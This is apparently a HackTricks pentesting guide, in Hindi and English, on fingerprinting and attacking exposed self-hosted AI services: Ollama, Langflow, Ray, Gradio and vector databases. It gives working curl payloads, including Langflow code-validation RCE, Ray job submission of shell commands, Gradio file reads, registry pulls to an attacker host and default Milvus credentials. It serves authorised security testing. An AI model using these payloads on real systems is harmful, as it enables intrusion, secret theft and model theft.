# Exposed Self-Hosted AI Services

{{#include ../banners/hacktricks-training.md}}

AI features बनाने वाली टीमें अक्सर अपने model runners, agent builders, demo UIs, compute clusters और vector databases चलाती हैं। इनमें से कई tools लैपटॉप या बंद lab network के लिए डिज़ाइन किए गए थे, इसलिए इनमें **डिफ़ॉल्ट रूप से authentication नहीं होता** या authentication shortcut enabled रहता है। जब attacker ऐसे किसी service तक पहुँच सकता है, तो आम तौर पर इन समूहों में से कोई एक असर होता है:

- GPUs और models का मुफ़्त इस्तेमाल, और private models की चोरी।
- Prompts, documents और embeddings का Leakage।
- Process environment से secrets का Leakage (LLM provider keys, cloud credentials)।
- Code execution, क्योंकि इनमें से कुछ APIs **feature के रूप में** code चलाती हैं।

यह पेज बताता है कि इन services को कैसे खोजें और हर तरह की API पर क्या जाँचें। Self-hosted inference server को harden करने और llama.cpp `/slots` leak के लिए, [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening) देखें। Malicious model files के लिए, [AI Models RCE](AI-Models-RCE.md) देखें।

## Fingerprinting

इन requests को credentials के बिना भेजें। अपेक्षित fields वाला JSON answer product की पहचान करता है और अक्सर version भी बताता है, जिससे पता चलता है कि नीचे दिए गए checks में से कौन-से लागू होते हैं। Ports, documented defaults या official run examples में इस्तेमाल किए गए ports हैं।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Product | Common port | Unauthenticated request | What identifies it |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Version JSON, local models की सूची |
| Langflow | 7860 | `GET /api/v1/version` | Langflow version JSON |
| Gradio | 7860 | `GET /config` | Gradio version और component IDs वाला app config |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, submitted jobs की सूची |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat value, Chroma version |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant version, collection list |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate version, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Collection list या auth error |

इन services को अक्सर किसी path prefix के पीछे reverse proxy से भी publish किया जाता है (उदाहरण के लिए `/ollama/` या `/ray/`), इसलिए JavaScript bundles या API documentation में मिले किसी भी prefix के अंतर्गत requests दोबारा भेजें।

## Unauthenticated inference और model-management APIs

Model runners आम तौर पर एक ही REST API expose करते हैं, जिसमें inference routes और administrative routes मिले-जुले होते हैं। Ollama इसका अच्छा उदाहरण है। इसमें built-in authentication नहीं है और यह डिफ़ॉल्ट रूप से `127.0.0.1:11434` से bind होता है, जबकि `OLLAMA_HOST` bind address बदलता है।<sup>[[1]](#references)[[15]](#references)</sup> Official Docker image container के अंदर `OLLAMA_HOST=0.0.0.0:11434` सेट करती है, `EXPOSE 11434` declare करती है और इसमें `USER` instruction नहीं है, इसलिए server container में root के रूप में चलता है।<sup>[[16]](#references)</sup> `EXPOSE` host पर port publish नहीं करता, इसलिए host तक पहुँच deployment पर निर्भर करती है। Documented `docker run` commands में `-p 11434:11434` का इस्तेमाल होता है, और Docker ऐसी mapping को सभी host interfaces पर publish करता है, जब तक कोई host IP न दिया जाए।<sup>[[17]](#references)[[18]](#references)</sup>

हर route group attacker को क्या देता है:<sup>[[2]](#references)</sup>

| Routes | Unauthenticated होने पर असर |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Local और loaded models की सूची, जिसमें private custom models भी शामिल हैं |
| `POST /api/show` | Model की जानकारी, जिसमें Modelfile, template और **system prompt** शामिल हैं |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Victim के hardware पर मुफ़्त inference |
| `POST /api/pull`, `/api/push` | Server से attacker द्वारा चुनी गई registry से model download करवाना या उस पर model upload करवाना |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Models बनाना, overwrite करना या delete करना |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

मॉडल सूची बिना credentials के लौटना ही exposure साबित करता है। Custom models में अक्सर `/api/show` में internal system prompt होता है। आपके host की ओर pull होना साबित करता है कि server attacker द्वारा चुनी गई registries से manifests fetch करता है। आपकी registry की ओर `/api/push` exposure को model theft में बदल देता है। वास्तविक targets पर create या delete routes को call न करें।

Registry pulls parser attack surface भी हैं, क्योंकि server remote manifest की values का उपयोग करके blobs store करता है। Probllama (CVE-2024-37032, Ollama 0.1.34 में ठीक किया गया) में manifest का `digest` बिना validation के file name के रूप में इस्तेमाल किया गया था। इसलिए malicious registry `../` sequences का उपयोग करके blobs directory के बाहर files लिख सकती थी। ऐसा planted manifest push करना, जिसका digest किसी local file की ओर इशारा करता था, उस file को attacker की registry तक leak कर देता था। Wiz ने Docker में RCE हासिल किया, जहाँ server root के रूप में चलता है: उसने एक shared library लिखी और उसे `/etc/ld.so.preload` में जोड़ा, फिर `/api/chat` call किया ताकि एक नई process उसे load करे।<sup>[[15]](#references)</sup> जब कोई runner मनमानी registries से pull कर सकता हो, तो जाँचें कि वह manifest fields को paths में कैसे बदलता है।

## डिज़ाइन के अनुसार code execute करने वाले APIs

संबंधित: [Flowise में हर request के लिए workflow-code overrides](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise)।

### Job submission APIs

Distributed compute frameworks code execution को अपनी मुख्य सुविधा मानते हैं। Dashboard port (8265) पर Ray Jobs API `entrypoint` shell command स्वीकार करता है और उसे cluster पर चलाता है।<sup>[[19]](#references)</sup> Oligo ShadowRay research के अनुसार, Jobs API में authorization नहीं है और dashboard `0.0.0.0` से bind होता है। इससे संबंधित CVE-2023-48022 विवादित है, क्योंकि Ray को केवल नियंत्रित network के भीतर चलने के लिए बनाया गया है।<sup>[[20]](#references)</sup> Ray ने 2.52.0 में optional token authentication (`RAY_AUTH_MODE=token`) जोड़ा। Ray 2.59 में `ray.init()` से शुरू किए गए local clusters के लिए यह डिफ़ॉल्ट रूप से enabled है; उपलब्ध token के बिना `ray start --head` अब भी unauthenticated शुरू हो सकता है। Ray, 2.61 के लिए default authentication को व्यापक रूप से लागू करने की योजना बताता है, इसलिए यह मानने के बजाय कि dashboard खुला है, deployed version और launch mode जाँचें।<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

इस तरह के dashboards में पुराने versions पर जांचने लायक helper routes भी होते हैं। Ray 2.8.1 से पहले, `/log_proxy?url=` किसी भी HTTP(S) URL को fetch करता था (cloud metadata तक SSRF) और `/api/v0/logs/file` बिना authentication के मनमाना `filename` path स्वीकार करता था।<sup>[[8]](#references)</sup>

### Code "validation" endpoints जो function definitions चलाते हैं

Custom Python components स्वीकार करने वाले Agent builders कभी-कभी code को `ast` से parse करके और केवल function definitions को `exec()` से चलाकर "validate" करते हैं। यह सुरक्षित नहीं है। Python function define करते समय **decorators और default argument values को evaluate करता है**, इसलिए उनमें रखा code तब भी चलता है, जब function body कभी न चले। Langflow का `POST /api/v1/validate/code` इसी तरह काम करता था और 1.3.0 से पहले इसमें authentication नहीं था (CVE-2025-3248)। Command output वाला exception उठाने से endpoint response में output लौटाता है:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

किसी भी ऐसे endpoint को इस pattern के लिए जांचें जो user code को compile, lint या "check" करता हो, और सबूत के तौर पर DNS callback को प्राथमिकता दें।

### Auto-login और default superuser token routes

Single-user tools में अक्सर ऐसा shortcut होता है जो हर visitor को administrator के रूप में login कर देता है। Langflow में, `AUTO_LOGIN` सक्षम होने पर, `GET /api/v1/auto_login` किसी भी caller को default superuser के tokens देता है। इसके disabled होने पर, route `Auto login is disabled.` जवाब देता है।<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 से 1.10.0 तक यह सुविधा default रूप से सक्षम थी (CVE-2026-9103)। इसे ऊपर दिए गए authenticated code-validation route के साथ जोड़ने से unauthenticated RCE फिर संभव हो जाता है (CVE-2026-9198, Harish Kolla द्वारा रिपोर्ट किया गया)।<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> मौजूदा आधिकारिक release packages और Docker images automatic login को disabled रखते हैं और superuser password की मांग करते हैं, लेकिन development branches में यह enabled रहता है।<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Code execution के बिना भी, superuser token से हर flow और stored provider credentials तक access मिलता है। Automated testing में संबंधित prerequisite check के लिए, देखें [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md)।

## ML demo UIs में file-serving और RPC routes

ML demo frameworks, generic route के ज़रिए uploaded और generated files serve करते हैं और frontend को server-side component helpers call करने देते हैं। Gradio इसके लिए `/config`, `/upload` और `/file=<path>` उपलब्ध कराता है।<sup>[[5]](#references)</sup> ऐसे किसी भी framework पर इन दो patterns की जाँच करना उपयोगी है:

- **Upload subdirectory से traversal:** अगर file route केवल यह जाँचता है कि path temp folder के अंदर से शुरू होता है, तो subdirectory बनाने के लिए एक file upload करें, फिर `../` या `%2e%2e%2f` के ज़रिए उससे बाहर जाएँ। Gradio 4.0 से 4.10 (CVE-2023-51449) तक इस तरह vulnerable था।<sup>[[26]](#references)[[27]](#references)</sup> Request को `curl --path-as-is` के साथ भेजें, ताकि client path को normalize न करे।
- **Arbitrary method dispatch:** user input के साथ `getattr(component, fn_name)` call करने वाला endpoint attacker को internal helpers call करने देता है। 4.13.0 से पहले, Gradio का `/component_server` ऐसा करता था। 4.3 से 4.12 में, `move_resource_to_block_cache` किसी भी local file को cache में copy कर देता था, जहाँ से `/file=` उसे download कर सकता था। 3.47 से 3.50.2 तक, अन्य helpers से file read और full-read SSRF संभव था।<sup>[[26]](#references)[[28]](#references)</sup> Fixed server उन helpers के लिए `Function not found.` जवाब देता है जिन्हें server functions के रूप में mark नहीं किया गया है।<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Hugging Face Spaces पर Space secrets environment variables होते हैं, इसलिए `/proc/self/environ` सबसे मूल्यवान फ़ाइल है। Horizon3 ने इसे HTTP `Range` header के ज़रिए पढ़ा।<sup>[[26]](#references)</sup>

## RAG द्वारा उपयोग किए जाने वाले vector databases

RAG मूल दस्तावेज़ों के chunks, उनके embeddings और metadata को vector database में स्टोर करता है, और assistant शीर्ष परिणामों को अपने prompt में रखता है। इसलिए Read access से **निजी दस्तावेज़ों का plain text** leak होता है। Write access से attacker ऐसे chunks डाल सकता है जिन्हें बाद में अन्य users के prompts में retrieve किया जाता है। यह persistent indirect prompt injection है (देखें [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection))।

Self-hosted vector databases के लिए जाँचें कि authentication कॉन्फ़िगर है या anonymous access enabled है:

- **Qdrant**: self-deployed instances सभी interfaces पर बिना authentication के listen करते हैं। कॉन्फ़िगर किए जाने पर, key `api-key` header में या `Authorization: Bearer` के रूप में जाती है। Read-only और per-collection keys भी हो सकती हैं।<sup>[[11]](#references)</sup>
- **Chroma**: authentication डिफ़ॉल्ट रूप से disabled है। Token auth में `Authorization` या `X-Chroma-Token` का उपयोग होता है।<sup>[[29]](#references)</sup>
- **Weaviate**: anonymous access enabled होने पर, बिना credentials के requests को `user: anonymous` के रूप में authenticate किया जाता है और उस user की permissions मिलती हैं।<sup>[[30]](#references)</sup>
- **Milvus**: authentication तब तक बंद रहता है, जब तक `common.security.authorizationEnabled` `true` न हो। चालू होने पर, डिफ़ॉल्ट `root` user का password `Milvus` होता है और token format `username:password` होता है।<sup>[[31]](#references)[[14]](#references)</sup>

बिना credentials के निजी data वाला response exposure दर्शाता है। जहाँ authentication enabled है, वहाँ किसी भी अपरिवर्तित default account का अलग से आकलन करें:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

जाँचें कि payloads में दस्तावेज़ का टेक्स्ट, उपयोगकर्ता पहचानकर्ता या tenant के नाम तो नहीं हैं। Production data को दूषित किए बिना write access दिखाने के लिए, एक खाली और स्पष्ट नाम वाला collection बनाएँ और तुरंत हटा दें—और ऐसा केवल तभी करें जब scope इसकी अनुमति देता हो।

इन servers पर authentication जाँच भी बहुत देर से हो सकती है। Chroma के Python FastAPI server (1.0.0 से कम-से-कम 1.5.8 तक, CVE-2026-45829) में collection बनाने वाले route ने authentication जाँच से पहले client द्वारा दिया गया embedding function बनाया। `trust_remote_code: true` के साथ attacker-नियंत्रित Hugging Face model को refer करने वाले configuration ने अनुरोध अस्वीकार होने पर भी attacker का code चलाया। Rust frontend प्रभावित नहीं था।<sup>[[32]](#references)</sup> जब किसी अनुरोध में model या plugin configuration हो, तो बिना credentials के इसका परीक्षण करें और देखें कि आपके model repository पर कोई outbound fetch होता है या नहीं।

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API दस्तावेज़](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow source - API v1 endpoints](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio source - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio source - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray source - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, Versions 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma source - Python client के डिफ़ॉल्ट](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma source - FastAPI server routes](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - सुरक्षा](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI specification](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI specification](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvus Server से कनेक्ट करें](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama Remote Code Execution Vulnerability (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker दस्तावेज़](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - ports को प्रकाशित करना और expose करना](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: AI workloads को निशाना बनाने वाला पहला ज्ञात attack campaign, जिसका जंगली परिवेश में फायदा उठाया गया](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token authentication](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - किसी भी गति पर असुरक्षित: Langflow AI में Unauth RCE के लिए Python Exec का दुरुपयोग](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow source - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Hugging Face Spaces से secrets चुराने के लिए Gradio की File Read Vulnerabilities का फायदा उठाना](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio advisory GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio का `/component_server` के लिए fix commit](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma-native Auth](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Authentication](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - उपयोगकर्ता की पहुँच प्रमाणित करें](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast Served Pre-Auth](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM Security Bulletin - Auto-Login Bypass और Code Validation के ज़रिए Unauthenticated Remote Code Execution (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
